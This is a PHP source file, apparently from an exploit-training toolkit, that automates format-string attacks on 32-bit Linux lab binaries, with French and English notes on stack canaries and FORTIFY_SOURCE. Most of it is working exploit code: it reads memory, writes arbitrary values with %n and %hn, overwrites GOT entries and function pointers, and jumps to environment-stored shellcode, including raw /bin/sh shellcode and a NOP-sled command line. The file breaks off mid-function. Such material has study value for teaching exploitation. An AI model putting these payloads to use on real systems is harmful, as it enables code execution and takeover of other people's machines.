<?php

// trop de decalage si on lance 32 bits sur un 64bits ce n'est pas du tout pareil sur les got.plt ne reagissent pas
// tester les jump ESP avec la stack argv format strings
/*
 * SSP, pour Stack Smashing Protection, est une protection introduite par GCC depuis sa version 4.1.
 *
 * Cette protection permet de grandement limiter les débordements sur la pile de plusieurs manières :
 *
 * - En plaçant un "Cookie" (Généralement une valeur aléatoire ou semi-aléatoire) entre les variables locales et le saved-ebp et le saved-eip des fonctions à risques.
 * - En recopiant les arguments des fonctions sur la pile.
 * - En réorganisant les variables locales des fonctions.
 *
 * L’utilisation de cookies ou de canaries n’est pas une protection matérielle ou du système d’exploitation comme précedemment, mais une protection au niveau logiciel. En réalité, dès la compilation, les préludes et prologues des fonctions sont modifiés. Au tout début de l’exécution, le canary est placé dans le segment data et initialisé. C’est un entier aléatoire, de la taille d’un registre.
 *
 * lorsque un overflow intervient, la valeur du cookie n’est plus égale à celle spécifiée dans le segment data, puisqu’il est a priori très difficile de deviner le cookie. Ceci dit, ces protections peuvent être détournées de plusieurs façons selon l’implémentation : par exploitation de format strings permettant de passer outre l’écrasement du cookie, par exploitations type off-by-one (lorsque on peut écraser le SFP, on est capable de bouger la prochaine frame plus bas dans la pile ou dans la GOT, afin de pouvoir forcer la prochaine adresse de retour qui sera popée) ou encore par overflows dans le heap ou le segment data (écrasement du cookie).
 *
 * FORTIFY_SOURCE :Afin de compliquer les failles format string, la GLIBC s'est vue attribuer un patch de plus. Cette protection est compilée par défaut depuis la Ubuntu 8.10 (conformément à la man page), mais doit être activée avec le drapeau d'optimisation -O2 ou supérieur.
 * Reprenons notre code vulnérable en modifiant la ligne du printf
 * net("http://connect.ed-diamond.com/MISC/MISC-062/La-securite-applicative-sous-Linux");
 */
/*
 * Real family members:
 * • fprintf — prints to a FILE stream
 * • printf — prints to the ‘stdout’ stream
 * • sprintf — prints into a string
 * • snprintf — prints into a string with length checking
 * • vfprintf — print to a FILE stream from a va_arg structure
 * • vprintf — prints to ‘stdout’ from a va_arg structure
 * • vsprintf — prints to a string from a va_arg structure
 * • vsnprintf — prints to a string with length checking from a va_arg structure
 * Relatives:
 * • setproctitle — set argv[]
 * • syslog — output to the syslog facility
 * • others like err*, verr*, warn*, vwarn*
 *
 *
 * (gdb) x/s *((char **)environ)
 * (gdb) x/s *((char **)argv) = (gdb) x/s ((char *)argv[0])
 * (gdb) x/s ((char *)argv[1])
 */

/*
 *
 * 
 *
 *
 *
 * info functions
 *
 * When an attacker is able to supply his own format string, he will be able to read and write arbitrary data in memory.
 * This ability allows the attacker to read sensitive data such as passwords, inject shellcode, or alter program behavior at will.
 *
 * Fonction 2 replace: puts
 * Press Enter
 * Payload in two Times
 * Where: 0x0804a008
 * What: 0xffffd66a => How (0xffff=65535) - Low (0xd66a=54890) = 10645
 * 1/2 Payload
 * [addr][addr+2]%.[val.min - 8]x%[offset+1]$hn%.[val.max - val.min]x%[offset]$hn
 * /home/labs/Bureau/CEH/tmp/fmt_str_8 `python -c 'print "\x08\xa0\x04\x08\x0a\xa0\x04\x08%.54882x%11$hn%.10645x%10$hn"'`
 * argv[0] at 0xffffd2b7
 * argv[1] at 0xffffd2db
 * argv[2] at 0xffffd2e0 // n'apparait nulle part dans le programme (new tech maybe)
 * helloWorld() = 0x80486ea
 *
 */
/*
 * $this->article("Reste","
 * ./fmtbug $(python -c 'print \"\x68\x96\x04\x08\" + \"\x6a\x96\x04\x08\" + \"%49143u%6\$hn\" + \"%12913u%5\$hn\" + \"\x90\" * 500 + \"\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\"')
 * - 4 times adresses -> later, ce n'est pas necessaire
 * - tester sur n'importe quel programme
 * 
 * Not only printf is vulnerable to format bugs but also these functions
fprintf
printfsprintf
snprintf
vfprintf
vprintf
vsprintf
vsnprintf
setproctitle
syslog


# Instead of .dtors section, you can also overwrite __deregister_frame_info
# entry in .got or another function entry in .got (like exit(), and so on),
# or, if you like, main() or printf() return address locations. Other 
# interesting places are: C library hooks (__malloc_hook, __realloc_hook, 
# __free_hook), __atexit/__exit_funcs structures (static binaries only), 
# function pointers, and jumpbufs (if any).



Protections We Face: D_FORTIFY_SOURCE
- glibc protection at compilation level
- Compile and runtime checks for bound issues when destination size is known
	mem(cpy|pcpy|move|set), st[r|p][n]?cpy, str[n]?cat, [v]?s[n]?printf and gets
- %n format can't be in writeable memory
- Strict checks for dangerous functions (write, system, etc.)
- Forced hardened file masks in creation



















 */
// -O0 -D_FORTIFY_SOURCE=0 -U_FORTIFY_SOURCE -fno-pie -Wno-format -Wno-format-security -fno-stack-protector -z norelro -z execstack
// -w -O0 -ggdb -std=c99
// -static -D_FORTIFY_SOURCE=0 -fno-pie -Wno-format -Wno-format-security -fno-stack-protector -z norelro -z execstack







class ret2fmt4linux extends bin4linux{


	public function __construct($bin_bof) {
		parent::__construct($bin_bof);
		$name = __CLASS__;
		$rep_path = "$this->dir_tmp/$name";
		if (!file_exists($rep_path)) $this->create_folder($rep_path);
	}

	function ret2fmt_all(){
	    $this->titre(__FUNCTION__);
	    $this->ret2fmt_execution_shellcode();
	}
// ##################################### Format String Attack ##########################################
function ret2fmt_exploit_exemple() {
	$this->net("http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=&filter_exploit_text=format+string&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=");
	$this->pause();
	$this->ssTitre("acestream");
	$this->requette("wine C:\\users\\rohff\\Application\ Data\\ACEStream\\player\\ace_player.exe acestream://%p%p%p%p%s");
	$this->ssTitre("sudo <= 1.8.3p1 ");
	$this->cmd("No Host Found", "sudo -V | grep version ");
	$this->ssTitre("TP md_mod");
	$this->net("http://seclists.org/oss-sec/2013/q2/510");
	$this->cmd("ub12042", " echo md_%x.%x.%x.%x > /sys/module/md_mod/parameters/new_array; ls /dev/md_*");
	$this->pause();
}
function ret2fmt_display_format() {
	$this->ssTitre("Reading/Display in Memory");
	$query = "$this->file_path 'AAAA';echo ";
	$this->requette($query);
	$query = "$this->file_path 'AAAA-%p-%p-%p-%p';echo ";
	$this->requette($query);
	$query = "$this->file_path 'AAAA-%x-%x-%x-%x';echo ";
	$this->requette($query);
	$query = "$this->file_path 'AAAA-%s-%s-%x-%x';echo ";
	$this->requette($query);
	$query = "$this->file_path 'AAAA-%4\$x-%3\$x-%2\$x-%1\$x';echo ";
	$this->requette($query);
}
function ret2fmt_display_arbitrary_locations($start, $end) {
	$this->ssTitre("Reading/Display arbitrary locations");
	$this->pause();
	for($i = $start; $i < $end; $i ++)
		$this->requette("$this->file_path 'offset $i = %$i\$p:%$i\$s';echo");
	$this->pause();
}
function ret2fmt_display_location($hex_addr, $offset) {
	$this->ssTitre("Reading/Display locations in $hex_addr");
	$hex_addr = $this->hex2rev_32($hex_addr);
	$this->requette("$this->file_path `python -c 'print \"$hex_addr%$offset\$s\"'`;echo");
	$this->pause();
}
function ret2fmt_writing_arbitrary_location() {
	$this->titre("Writing/Modify arbitrary locations");
	$this->note("Même si la fonction printf est dans la plupart des cas utilisée pour lire ou afficher une variable, elle est aussi capable d’y écrire, et cela se fait avec %n.
Rappel : %n stock le nombre de caractères déjà écrits dans l’argument correspondant.");

	$offset = $this->ret2fmt_offset("AAAA", 41);
	$this->requette("$this->file_path `python -c 'print \"AAAA%$offset\$x\"'` ");
	$this->requette("$this->file_path `python -c 'print \"ABCD%$offset\$x\"'` ");
	$this->ssTitre("give i value ");
	$this->article("%n", " ECRIT là ou pointe la valeur qu'il cible sur la pile, et il y écrit le nombre de caractères déjà affichés avant lui par la fonction printf().");
	$this->requette("gdb -q --batch -ex \"print &i\" $this->file_path");
	$this->requette("gdb -q --batch -ex \"info symbol &i\" $this->file_path");
	$this->pause();
	$addr_i = trim($this->req_ret_str("gdb -q --batch -ex \"p &i\" $this->file_path | grep -Po \"0x[0-9a-fA-F]{7,8}\" "));
	$addr = $this->hex2rev_32($addr_i);
	$this->ssTitre("Set i = 200 ");
	$this->requette("$this->file_path `python -c 'print \"$addr%$offset\$n\"'` ");
	$this->requette("$this->file_path `python -c 'print \"$addr%.1x%$offset\$n\"'` ");
	$this->requette("$this->file_path `python -c 'print \"$addr%.100x%$offset\$n\"'` ");
	$this->requette("$this->file_path `python -c 'print \"$addr%.200x%$offset\$n\"'` ");
	$this->requette("$this->file_path `python -c 'print \"$addr%.196x%$offset\$n\"'` ");
	$this->pause();
}
function ret2fmt_pointeur_fonction() {
	$this->titre("Function Pointer");
	$this->article("Le but", " sera donc de réécrire un pointeur particulier, pointeur sur une fonction vers laquelle le programme sautera a un moment donné.");
	$offset = $this->ret2fmt_offset("AAAA", 41);
	$this->requette("$this->file_path `python -c 'print \"AAAA%$offset\$x\"'`");
	exec("$this->file_path `python -c 'print \"AAAA%$offset\$x\"'` | grep 'before' | cut -d'#' -f2 | cut -d'x' -f2 ", $tmp);
	$contenu_ptr_overwrite = $tmp [0];
	unset($tmp);
	exec("$this->file_path `python -c 'print \"AAAA%$offset\$x\"'` | grep access | cut -d'=' -f2 | cut -d'x' -f2 ", $tmp);
	$pointe2fonction = $tmp [0];
	unset($tmp);
	exec("$this->file_path `python -c 'print \"AAAA%$offset\$x\"'` | grep 'helloWorld()' | cut -d'x' -f2 ", $tmp);
	$normal = $tmp [0];
	unset($tmp);
	if (strlen($contenu_ptr_overwrite)!= 8)
		$contenu_ptr_overwrite = "0$contenu_ptr_overwrite";
	if (strlen($pointe2fonction)!= 8)
		$pointe2fonction = "0$pointe2fonction";
	if (strlen($normal)!= 8)
		$normal = "0$normal";
	$this->note("la fonction accessForbidden() n'est appelee null part dans le programme");
	$this->article("Detourner l'endroit du pointeur de fonction vers une autre fonction", "Detourner le pointage de cette adresse $contenu_ptr_overwrite vers notre nouvelle valeur d'adresse $pointe2fonction-4 au lieu de $normal\n\tDonc en resume on doit ecrire $pointe2fonction-4 a la place de $normal sur ptrf().");
	$this->question("the question is how to write $pointe2fonction ?");
	$this->gtitre("Get Shellcode");
	$this->ret2fmt_env_payload($contenu_ptr_overwrite, $pointe2fonction, $offset, "");
	$this->pause();
	// ret2fmt_brute_force_where_env(dechex(hexdec($contenu_ptr_overwrite)-40),dechex(hexdec($contenu_ptr_overwrite)+40),$pointe2fonction,$offset,$this->file_path);pause();
}
function ret2fmt_payload_1_times_env($where, $what, $offset, $option) {
	$this->ssTitre("===== Payload in one Times Shellcode Env ============");
	$this->article("5/5 Payload 1 Times Shellcode Env", "[addr]%.[val.addr - 4]x%[offset]\$n");
	$where = $this->hex2norme_32($where);
	$what = $this->hex2norme_32($what);
	$this->article("Where", $where);
	$this->article("What", "$what  = " . hexdec($what). " -4 bytes for &where");
	$what = hexdec($what)- 4; // -4 pour addr where
	$this->article("Offset", $offset);
	$cmd = "python -c 'print \"" . $this->hex2rev_32($where). "%.$what" . "x%$offset\$n\"'";
	$query = "$this->file_path  `$cmd` $option";
	$cmd_gdb = addcslashes($cmd, '"\\$');
	$this->payload2check4norme($cmd,$this->badchars); // $this->requette("gdb -q --batch -ex 'b 24' -ex \"run $($cmd)\" -ex 'x/x $where' -ex 'c' $this->file_path");pause();
	//$this->requette("echo \"b 27\\nrun \\$($cmd_gdb)\\ninfo symbol $where\\nx/x $where\\nx/s *$where\" > $this->dir_tmp/gdb_fmt_str.txt");
	//$this->requette("gdb -q --batch -x $this->dir_tmp/gdb_fmt_str.txt $this->file_path | tail -3");
	$this->requette($query);
	$this->pause();
	$id_result = $this->req_ret_str($query);
	$this->parse4id($id_result);
}
function ret2fmt_payload_2_times_env($where, $what, $offset, $option) {
	// %.0(pad 1)x%(arg number 1)$hn%.0(pad 2)x%(arg number 2)$hn(address 1)(address 2)(padding)
	/*
	 *
	 * • pad 1 is the lowest two bytes of the value you wish to write.
	 * • pad 2 is the highest two bytes of value, minus pad 1.
	 * • arg number 1 is the offset from the first argument to address 1 in the buffer.
	 * • arg number 2 is the offset from first argument to address 2 in the buffer.
	 * • address 1 is the address of lowest two bytes of address you wish to overwrite.
	 * • address 2 is address 1 + 2.
	 * • padding is between 0 and 4 bytes, to get the addresses on an even word boundary.
	 *
	 */
	$this->ssTitre("===== Payload in two Times Shellcode Env ===========");
	$where = $this->hex2norme_32($where);
	$what = $this->hex2norme_32($what);
	list($tmp1, $tmp2)= $this->what_2_times($what);
	if (hexdec($tmp1)< hexdec($tmp2)) {
		$low = $tmp1;
		$how = $tmp2;
		$diff = hexdec($how)- hexdec($low);
		$this->article("Where", $where);
		$this->article("What", "$what => How ($how=" . hexdec($how). ") - Low ($low=" . hexdec($low). ") = $diff ");
		$this->article("Offset", $offset);
		$this->article("3/5 Payload 2 Times Shellcode Env", "[addr][addr+2]%.[val.min-8]x%[offset+1]\$hn%.[diff(val.max-val.min)]x%[offset]\$hn\n");
		$cmd = "python -c 'print \"" . $this->hex2rev_32($where). $this->hex2rev_32(dechex(hexdec($where)+ 2)) . "%." . (hexdec($low)- 8) . "x%" . ($offset + 1) . "\$hn%.$diff" . "x%" . ($offset) . "\$hn\"'";
		$query = "$this->file_path  `$cmd` $option";
		$cmd_gdb = addcslashes($cmd, '"\\$');
		$this->payload2check4norme($cmd,$this->badchars);
		// $this->requette("gdb -q --batch -ex 'b 24' -ex \"run $($cmd)\" -ex 'x/x $where' -ex 'c' $this->file_path");pause();
		//$this->requette("echo \"b 27\\nrun \\$($cmd_gdb)\\ninfo symbol $where\\nx/x $where\\nx/s *$where\" > $this->dir_tmp/gdb_fmt_str.txt");
		//$this->requette("gdb -q --batch -x $this->dir_tmp/gdb_fmt_str.txt $this->file_path | tail -3");
		$this->requette($query);
		$id_result = $this->req_ret_str($query);
		$this->parse4id($id_result);
		$this->pause();
		
		$this->article("4/5 Payload 2 Times Shellcode Env", "[addr+2][addr]%.[val.min-8]x%[offset]\$hn%.[diff(val.max-val.min)]x%[offset+1]\$hn\n");
		$cmd = "python -c 'print \"" . $this->hex2rev_32(dechex(hexdec($where)+ 2)) . $this->hex2rev_32($where). "%." . (hexdec($low)- 8) . "x%" . ($offset) . "\$hn%." . $diff . "x%" . ($offset + 1) . "\$hn\"'"; // (hexdec($how)-hexdec($low))
		$query = "$this->file_path  `$cmd` $option";
		$cmd_gdb = addcslashes($cmd, '"\\$');
		// $this->requette("gdb -q --batch -ex 'b 24' -ex \"run $($cmd)\" -ex 'x/x $where' -ex 'c' $this->file_path");pause();
		//$this->requette("echo \"b 27\\nrun \\$($cmd_gdb)\\ninfo symbol $where\\nx/x $where\\nx/s *$where\" > $this->dir_tmp/gdb_fmt_str.txt");
		//$this->requette("gdb -q --batch -x $this->dir_tmp/gdb_fmt_str.txt $this->file_path | tail -3");
		$this->requette($query);
		$id_result = $this->req_ret_str($query);
		$this->parse4id($id_result);
		$this->pause();
		
	} else {
		$how = $tmp1;
		$low = $tmp2;
		$diff = hexdec($how)- hexdec($low);
		$this->article("Where", $where);
		$this->article("What", "$what => How ($how=" . hexdec($how). ") - Low ($low=" . hexdec($low). ") = $diff ");
		$this->article("Offset", $offset);
		$this->article("3/5 Payload 2 Times Shellcode Env", "[addr][addr+2]%.[val.min-8]x%[offset]\$hn%.[diff(val.max-val.min)]x%[offset+1]\$hn\n");
		$cmd = "python -c 'print \"" . $this->hex2rev_32($where). $this->hex2rev_32(dechex(hexdec($where)+ 2)) . "%." . (hexdec($low)- 8) . "x%" . ($offset) . "\$hn%.$diff" . "x%" . ($offset + 1) . "\$hn\"'";
		$query = "$this->file_path  `$cmd` $option";
		$cmd_gdb = addcslashes($cmd, '"\\$');
		$this->payload2check4norme($cmd,$this->badchars);
		//$this->requette("gdb -q --batch -ex 'b 24' -ex \"run $($cmd)\" -ex 'x/x $where' -ex 'c' $this->file_path");pause();
		//$this->requette("echo \"b 27\\nrun \\$($cmd_gdb)\\ninfo symbol $where\\nx/x $where\\nx/s *$where\" > $this->dir_tmp/gdb_fmt_str.txt");
		//$this->requette("gdb -q --batch -x $this->dir_tmp/gdb_fmt_str.txt $this->file_path | tail -3");
		$this->requette($query);
		$id_result = $this->req_ret_str($query);
		$this->parse4id($id_result);
		$this->pause();
		
		$this->article("4/5 Payload 2 Times Shellcode Env", "[addr+2][addr]%.[val.min-8]x%[offset+1]\$hn%.[diff(val.max-val.min)]x%[offset]\$hn\n");
		$cmd = "python -c 'print \"" . $this->hex2rev_32(dechex(hexdec($where)+ 2)) . $this->hex2rev_32($where). "%." . (hexdec($low)- 8) . "x%" . ($offset + 1) . "\$hn%." . $diff . "x%" . ($offset) . "\$hn\"'";
		$query = "$this->file_path  `$cmd` $option";
		$cmd_gdb = addcslashes($cmd, '"\\$');
		// $this->requette("gdb -q --batch -ex 'b 24' -ex \"run $($cmd)\" -ex 'x/x $where' -ex 'c' $this->file_path");pause();
		//$this->requette("echo \"b 27\\nrun \\$($cmd_gdb)\\ninfo symbol $where\\nx/x $where\\nx/s *$where\" > $this->dir_tmp/gdb_fmt_str.txt");
		//$this->requette("gdb -q --batch -x $this->dir_tmp/gdb_fmt_str.txt $this->file_path | tail -3");
		$this->requette($query);
		$id_result = $this->req_ret_str($query);
		$this->parse4id($id_result);
		$this->pause();
	}
}
function ret2fmt_payload_4_times_env($where, $what, $offset, $option) {
	// /fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08". "\x96\x97\x04\x08" . "\x97\x97\x04\x08"')%98x%4\$n%139x%5\$n%258x%6\$n%192x%7\$n
	// /fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08". "\x96\x97\x04\x08" . "\x97\x97\x04\x08"')%98x%4\$n%139x%5\$n
	// /fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08". "\x96\x97\x04\x08" . "\x97\x97\x04\x08"')%4\$n
	$this->ssTitre("===== Payload in 4 Times Shellcode Env ===========");
	$where = $this->hex2norme_32($where);
	$what = $this->hex2norme_32($what);
	$this->article("Where", $where);
	$this->article("What", $what);
	$this->article("Offset", $offset);
	list($val, $val1, $val2, $val3)= $this->what_4_times($what);
	list($val, $val1, $val2, $val3)= array_map("hexdec", array ($val,$val1,	$val2,	$val3));
	$this->article("0xval:val1:val2:val3", "$val:$val1:$val2:$val3");
	// $diff = hexdec($how)-hexdec($low);
	$val3_p = $val3 - 16;
	if ($val3_p <= 0)
		$val3_p = $val3_p + 256;
	$val2_p = $val2 - $val3;
	if ($val2_p <= 0)
		$val2_p = $val2_p + 256;
	$val1_p = $val1 - $val2;
	if ($val1_p <= 0)
		$val1_p = $val1_p + 256;
	$val_p = $val - $val1;
	if ($val_p <= 0)
		$val_p = $val_p + 256;
	$this->article("val:val1:val2:val3", "$val_p:$val1_p:$val2_p:$val3_p");
	// important("Check si il y'a un decalage entre $what et gdb");
	$this->article("1/5 Payload 4 Times Shellcode Env", "[addr][addr+1][addr+2][addr+3]%.[val3-16]x%[offset]\$n%.[val2]x%[offset+1]\$n%.[val1]x%[offset+2]\$n%.[val]x%[offset+3]\$n\n");
	$cmd = "python -c 'print \"" . $this->hex2rev_32($where). $this->hex2rev_32(dechex(hexdec($where)+ 1)) . $this->hex2rev_32(dechex(hexdec($where)+ 2)) . $this->hex2rev_32(dechex(hexdec($where)+ 3)) . "%." . ($val3_p) . "x%" . ($offset) . "\$n%." . ($val2_p) . "x%" . ($offset + 1) . "\$n%.$val1_p" . "x%" . ($offset + 2) . "\$n%.$val_p" . "x%" . ($offset + 3) . "\$n\"'";
	$query = "$this->file_path  `$cmd` $option";
	$cmd_gdb = addcslashes($cmd, '"\\$');
	$this->payload2check4norme($cmd,$this->badchars);
	// $this->requette("gdb -q --batch -ex 'b 24' -ex \"run $($cmd)\" -ex 'x/x $where' -ex 'c' $this->file_path");pause();
	//$this->requette("echo \"b 27\\nrun \\$($cmd_gdb)\\ninfo symbol $where\\nx/x $where\\nx/s *$where\" > $this->dir_tmp/gdb_fmt_str.txt");
	//$this->requette("gdb -q --batch -x $this->dir_tmp/gdb_fmt_str.txt $this->file_path | tail -3");
	$this->requette($query);
	$id_result = $this->req_ret_str($query);
	$this->parse4id($id_result);
	$this->pause();
	
	$this->article("2/5 Payload 4 Times Shellcode Env", "[addr+3][addr+2][addr+1][addr]%.[val3-16]x%[offset]\$n%.[val2]x%[offset+1]\$n%.[val1]x%[offset+2]\$n%.[val]x%[offset+3]\$n\n");
	$cmd = "python -c 'print \"" . $this->hex2rev_32(dechex(hexdec($where)+ 3)) . $this->hex2rev_32(dechex(hexdec($where)+ 2)) . $this->hex2rev_32(dechex(hexdec($where)+ 1)) . $this->hex2rev_32($where). "%." . ($val3_p) . "x%" . ($offset + 3) . "\$n%.$val2_p" . "x%" . ($offset + 2) . "\$n%.$val1_p" . "x%" . ($offset + 1) . "\$n%.$val_p" . "x%" . ($offset) . "\$n\"'";
	$query = "$this->file_path  `$cmd` $option";
	$cmd_gdb = addcslashes($cmd, '"\\$');
	$this->payload2check4norme($cmd,$this->badchars);
	// $this->requette("gdb -q --batch -ex 'b 24' -ex \"run $($cmd)\" -ex 'x/x $where' -ex 'c' $this->file_path");pause();
	//$this->requette("echo \"b 27\\nrun \\$($cmd_gdb)\\ninfo symbol $where\\nx/x $where\\nx/s *$where\" > $this->dir_tmp/gdb_fmt_str.txt");
	//$this->requette("gdb -q --batch -x $this->dir_tmp/gdb_fmt_str.txt $this->file_path | tail -3");
	$this->requette($query);
	$id_result = $this->req_ret_str($query);
	$this->parse4id($id_result);
	$this->pause();
}




function ret2fmt_execution_shellcode() {
	$this->chapitre("Let's get SHELL By Hooking function in GOT ");
	$name = "fmt_str_8";
	$option = "";
	$offset = $this->ret2fmt_offset("AAAA", 41);
		
	$this->ret2fmt_execution_shellcode_got($offset);
	$this->notify("END Execution SHELLCODE ");
}





function ret2fmt_execution_shellcode_stack($where, $what, $offset, $shellcode, $nops) {
	$this->ssTitre("Put shellcode in the stack (argv[1]) and point it to execute");
	/*
	 * digraph g {
	 * 2: node [shape = record,height=.1];
	 * 3: node0[label = "<f0> |<f1> G|<f2> "];
	 * 4: node1[label = "<f0> |<f1> E|<f2> "];
	 * 5: node2[label = "<f0> |<f1> B|<f2> "];
	 * 6: node3[label = "<f0> |<f1> F|<f2> "];
	 * 7: node4[label = "<f0> |<f1> R|<f2> "];
	 * 8: node5[label = "<f0> |<f1> H|<f2> "];
	 * 9: node6[label = "<f0> |<f1> Y|<f2> "];
	 * 10: node7[label = "<f0> |<f1> A|<f2> "];
	 * 11: node8[label = "<f0> |<f1> C|<f2> "];
	 * 12: "node0":f2 -> "node4":f1;
	 * 13: "node0":f0 -> "node1":f1;
	 * 14: "node1":f0 -> "node2":f1;
	 * 15: "node1":f2 -> "node3":f1;
	 * 16: "node2":f2 -> "node8":f1;
	 * 17: "node2":f0 -> "node7":f1;
	 * 18: "node4":f2 -> "node6":f1;
	 * 19: "node4":f0 -> "node5":f1;
	 * 20: }
	 */
	// Overwriting saved EIP (returns the address after having located it on the stack)
	// Ptr to “AAAA%d%...” Ret addr to printf caller old ebp
	// [shellcode][%.taille_du_buffer-shell_coded][RET_qui_pointe_sur_le_shell_code]
	// (gdb) set $esp = 0
	// info frame 0
	
	/*
	 * $this->article("1/15 Payload Stack 1 Times","[addr][shellcode]%.[val.addr-(4+longueur shellcode)]x%[offset]\$n");
	 * $this->article("2/15 Payload Stack 1 Times","[addr]%.[val.addr-(4)]x%[offset]\$n[shellcode]");
	 * $this->article("3/15 Payload Stack 1 Times","[addr][&shellcode]%.[val.addr-(4+4)]x%[offset][shellcode]\$n");
	 *
	 * $this->article("4/15 Payload Stack 2 Times","[addr][addr+2][shellcode]%.[val.min -(8+longueur shellcode)]x%[offset+1]\$hn]%.[val.max - val.min]x%[offset]\$hn]\n");
	 * $this->article("5/15 Payload Stack 2 Times","[addr][addr+2]%.[val.min -(8)]x%[offset+1]\$hn]%.[val.max - val.min]x%[offset]\$hn][shellcode]\n");
	 * $this->article("6/15 Payload Stack 2 Times","[addr][addr+2][&shellcode]%.[val.min -(8 + 4)]x%[offset+1]\$hn]%.[val.max - val.min]x%[offset]\$hn][shellcode]\n");
	 * $this->article("7/15 Payload Stack 2 Times","[addr+2][addr][shellcode]%.[val.min-(8+longueur shellcode)]x%[offset]\$hn%.[diff(val.max-val.min)]x%[offset+1]\$hn\n");
	 * $this->article("8/15 Payload Stack 2 Times","[addr+2][addr]%.[val.min-(8)]x%[offset]\$hn%.[diff(val.max-val.min)]x%[offset+1]\$hn[shellcode]\n");
	 * $this->article("9/15 Payload Stack 2 Times","[addr+2][addr][&shellcode]%.[val.min-(8+4)]x%[offset]\$hn%.[diff(val.max-val.min)]x%[offset+1]\$hn[shellcode]\n");
	 *
	 * $this->article("10/15 Payload Stack 4 Times","[addr][addr+1][addr+2][addr+3][shellcode]%.[val3-(16+longueur shellcode)]x%[offset]\$n%.[val2]x%[offset+1]\$n%.[val1]x%[offset+2]\$n%.[val]x%[offset+3]\$n\n");
	 * $this->article("11/15 Payload Stack 4 Times","[addr][addr+1][addr+2][addr+3]%.[val3-16]x%[offset]\$n%.[val2]x%[offset+1]\$n%.[val1]x%[offset+2]\$n%.[val]x%[offset+3]\$n[shellcode]\n");
	 * $this->article("12/15 Payload Stack 4 Times","[addr][addr+1][addr+2][addr+3][&shellcode]%.[val3-(16+4)]x%[offset]\$n%.[val2]x%[offset+1]\$n%.[val1]x%[offset+2]\$n%.[val]x%[offset+3]\$n[shellcode]\n");
	 * $this->article("13/15 Payload Stack 4 Times","[addr+3][addr+2][addr+1][addr][shellcode]%.[val3-(16+longueur shellcode)]x%[offset]\$n%.[val2]x%[offset+1]\$n%.[val1]x%[offset+2]\$n%.[val]x%[offset+3]\$n\n");
	 * $this->article("14/15 Payload Stack 4 Times","[addr+3][addr+2][addr+1][addr]%.[val3-(16)]x%[offset]\$n%.[val2]x%[offset+1]\$n%.[val1]x%[offset+2]\$n%.[val]x%[offset+3]\$n[shellcode]\n");
	 * $this->article("15/15 Payload Stack 4 Times","[addr+3][addr+2][addr+1][addr][&shellcode]%.[val3-(16+4)]x%[offset]\$n%.[val2]x%[offset+1]\$n%.[val1]x%[offset+2]\$n%.[val]x%[offset+3]\$n[shellcode]\n");
	 */
	
	// stack_size($this->file_path);
	// $shellcode = str_repeat("\x90",$nops).$shellcode ;
	// $size_shellcode = shellcode_size($shellcode)-1;
}
function ret2fmt_execution_shellcode_env($where, $offset) { // OK
	
	$this->chapitre("Shellcode In Env");
	
	$nops = 0 ;
	$option = "";
	$this->article("ENV 5 differents payloads template ", '
		1/5 PAYLOAD 4 TIMES SHELLCODE ENV: [addr][addr+1][addr+2][addr+3]%.[val3]x%[offset]$n%.[val2]x%[offset+1]$n%.[val1]x%[offset+2]$n%.[val]x%[offset+3]$n
		2/5 PAYLOAD 4 TIMES SHELLCODE ENV: [addr+3][addr+2][addr+1][addr]%.[val3-16]x%[offset]$n%.[val2]x%[offset+1]$n%.[val1]x%[offset+2]$n%.[val]x%[offset+3]$n
		3/5 PAYLOAD 2 TIMES SHELLCODE ENV: [addr][addr+2]%.[val.min-8]x%[offset+1]$hn%.[diff(val.max-val.min)]x%[offset]$hn
		4/5 PAYLOAD 2 TIMES SHELLCODE ENV: [addr+2][addr]%.[val.min-8]x%[offset]$hn%.[diff(val.max-val.min)]x%[offset+1]$hn
		5/5 PAYLOAD 1 TIMES SHELLCODE ENV: [addr]%.[val.addr-4]x%[offset]$n
			');
	$this->pause();
	$shellcode_bin_sh = '\xbb\x90\x32\x10\x70\xda\xde\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x5d\x11\x03\x5d\x11\xe2\x65\x58\x1b\x28\x1c\xcf\x7d\xa0\x33\x93\x08\xd7\x23\x7c\x78\x70\xb3\xea\x51\xe2\xda\x84\x24\x01\x4e\xb1\x3f\xc6\x6e\x41\x6f\xa4\x07\x2f\x40\x5b\xbf\xaf\xc9\xc8\xb6\x51\x38\x6e';
	$shellcode_echo = '\xba\xaa\xeb\x29\x44\xd9\xce\xd9\x74\x24\xf4\x5f\x29\xc9\xb1\x14\x31\x57\x13\x83\xef\xfc\x03\x57\xa5\x09\xdc\x2e\xb2\x95\x86\xfd\xa2\x4d\x94\x62\xa3\x69\x8e\x4b\xc0\x1d\x4f\xfc\x09\xbc\x26\x92\xdc\xa3\xeb\x82\xf4\x23\x0c\x53\x27\x46\x65\x3d\x18\xe3\x16\xa9\x09\xcb\xf5\x4c\xf5\x29\x0f\x86\xee\x76\x3c\xaf\x2b\xbd\x73\xf4\x7a\x86\x42\x67\x5f\x8a\xcb\x1f\xf9\x0c\x37\xfb\x5e\xe1\x5a\xd9\x40\x01\xf2\x4e\x09\xe0\x31\xf0';
	// $shellcode = shellcode_msf2c_norme("/bin/sh");shellcode_hex2exec($shellcode);
	// $shellcode = shellcode_msf2c_norme("/bin/echo \\\"\t\t\033[37;41;1;1m#rohff#\033[0m\\\" ");shellcode_hex2exec($shellcode);
	$shellcode = $shellcode_bin_sh;
	//$shellcode = $shellcode_echo;
	$shellcode = $this->shellcode_id;
	

	$shellcode_raw = $this->hex2raw($shellcode);
	$size_shellcode = $nops + $this->hex2size($shellcode);
	$this->raw2env($shellcode_raw, $nops);
	$this->pause();
	$hex_addr_sc_env = $this->elf2addr4env("shellcode");
	$this->pause();
	$what_env = $hex_addr_sc_env;
	$this->article("what2env", $what_env);
	$this->pause();
	$this->ret2fmt_env_payload($where, $what_env, $offset, $option); // OK
}








function ret2fmt_execution_shellcode_got($offset) {
	// GOT
